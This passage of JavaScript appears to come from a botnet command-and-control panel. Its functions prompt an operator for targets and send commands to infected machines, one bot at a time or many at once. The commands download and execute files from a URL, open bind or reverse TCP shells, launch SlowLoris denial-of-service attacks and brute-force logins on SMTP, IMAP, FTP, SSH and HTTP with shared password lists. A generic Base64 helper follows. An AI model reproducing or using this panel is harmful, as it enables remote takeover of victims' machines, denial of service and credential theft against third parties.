			var f = prompt('Write the port to bind on');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'rtcp':
			var f = prompt('Write the host/IP to connect to');
			if(f==null || f==""){return;}
			cmd += f + "|";
			f = prompt('Write the port to connect to');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'sl':
			var f = prompt('Write the host/IP to attack [leave blank to stop any running SlowLoris attack]')
			if(f==null){return;}
			cmd += f;
			break;
		case 'co':
			var f = prompt('Write the service to attack [smtp,imap,ftp,ssh,httpget,httppost]')
			if(f==null || f==""){return;}
			cmd += f + " ";
			f = prompt('Write the service\'s host to attack')
			if(f==null || f==""){return;}
			cmd += f + " ";
			f = prompt('Write the user to attack')
			if(f==null || f==""){return;}
			cmd += f + " ";
			f = prompt('Write the passwords to use [separate them with \'#\'. Ex: pass1#pass2#pass3#....]')
			if(f==null || f==""){return;}
			cmd += f + "|";
			f = prompt('Write the service\'s port to attack on [leave blank to use default]')
			if(f==null){return;}
			cmd += f;
			break;
		case 'gb':
			var confirm = prompt('Write YES (all caps) to confirm');
			if(confirm==null || confirm!='YES'){return;}
			alert('Bot will be erased next time it connects. Till then, all files will remain, use them wisely.');
			httpGet(window.location.href,'POST',function(a){
				shownotify(a);
			},'do=gb&botid='+id);
			return;
			break;
	}
	httpGet(window.location.href,'POST',function(a){
		shownotify(a);
	},'do=cmd&botid='+id+'&cmd='+cmd);
}
function remove(str, startIndex, count) {
    return str.substr(0, startIndex) + str.substr(startIndex + count);
}
function doSearch(){
	var post_data='do=search';
	var ssvar=document.getElementById('s-s');
	if (ssvar.value!=''){post_data+='&ss='+ssvar.value;}
	var scvar=document.getElementById('s-c');
	if (scvar.value!=''){post_data+='&sc='+scvar.value;}
	var sovar=document.getElementById('s-o');
	if (sovar.value!=''){post_data+='&so='+sovar.value;}
	httpGet(window.location.href,'POST',function(a){
		var dv = document.getElementById('sv');
		if(a.indexOf('|') >= 0){
			dv.innerHTML='';
			var a_arr = a.split('|');
			document.getElementById('sbc').innerHTML='Total found: '+a_arr[0];
			for (var i = a_arr.length - 2; i >= 1; i--) {
				sv.innerHTML+=a_arr[i];
			}
		}else{
			if(a=="reload"){window.location.href=window.location.href;}
			dv.innerHTML='<BR><BR><BR>'+a;
			return;
		}
	},post_data);
}
function botsccc(val){
	if(val==''){return;}
	var elms = document.getElementById('sv').getElementsByTagName('div');
	if(elms.length=='0'){alert('Find some bots to work with before you start working 0.0 !!'); document.getElementsByClassName('tab-bots')[0].className='tab-bots search'; return;};
	var cmd = val + " ";
	switch(val.toLowerCase()){
		case 'df':
			var f = prompt('Write the URL to download from');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'x':
			var f = prompt('Write the file name to execute');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'x -cmd':
			var f = prompt('Write the file name to execute');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'update':
			var f = prompt('Write the URL to update from');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'btcp':
			var f = prompt('Write the port to bind on');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'rtcp':
			var f = prompt('Write the host/IP to connect to');
			if(f==null || f==""){return;}
			cmd += f + "|";
			f = prompt('Write the port to connect to');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'sl':
			var f = prompt('Write the host/IP to attack [leave blank to stop any running SlowLoris attack]')
			if(f==null){return;}
			cmd += f;
			break;
		case 'co':
			var f = prompt('Write the service to attack [smtp,imap,ftp,ssh,httpget,httppost]')
			if(f==null || f==""){return;}
			cmd += f + " ";
			f = prompt('Write the service\'s host to attack')
			if(f==null || f==""){return;}
			cmd += f + " ";
			f = prompt('Write the user to attack')
			if(f==null || f==""){return;}
			cmd += f + " ";
			alert("Now here you need focus! The passwords will be given in list format, by which I mean a list on the server of hosting in the folder 'uploads'.");
			alert("The list will be split equally among the found bots. The process of splitting will be handled with a PHP script that will give each bot a fair cut.");
			alert("The script is named 'cracking.php' in the folder 'extras'. Upload your passwords' list from 'CPanel' tab, and use it in the next prompt. If you used a list that does not exist, head to cracking.php and append a tag name for the list.");
			f = prompt('Write the passwords list to use')
			if(f==null || f==""){return;}
			if (window.location.href.contains('index.php')){
				cmd += window.location.href.split('index.php')[0];
			}
			cmd += "extras/cracking.php?list=" + f + "|";
			f = prompt('Write the service\'s port to attack on [leave blank to use default]')
			if(f==null){return;}
			cmd += f;
			break;
		case 'gb':
			var confirm = prompt('Write YES (all caps) to confirm');
			if(confirm==null || confirm!='YES'){return;}
			alert('Bots will be erased next time they connects. Till then, all files will remain, use them wisely.');
			for (var i = 0; i < elms.length; i++){
				httpGet(window.location.href,'POST',function(a){
					shownotify(a);
				},'do=gb&botid='+elms[i].getAttribute('botid'));
			}
			return;
			break;
	}
	for (var i = 0; i < elms.length; i++){
		httpGet(window.location.href,'POST',function(a){
			shownotify(a);
		},'do=cmd&botid='+elms[i].getAttribute('botid')+'&cmd='+cmd);
	}
}
var Base64 = {
    // private property
    _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    // public method for encoding
    encode : function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = Base64._utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
            this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
            this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
        }
        return output;
    },
    // public method for decoding
    decode : function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = Base64._utf8_decode(output);
        return output;
    },
    // private method for UTF-8 encoding
    _utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
        }
        return utftext;
    },
    // private method for UTF-8 decoding
    _utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while ( i < utftext.length ) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}
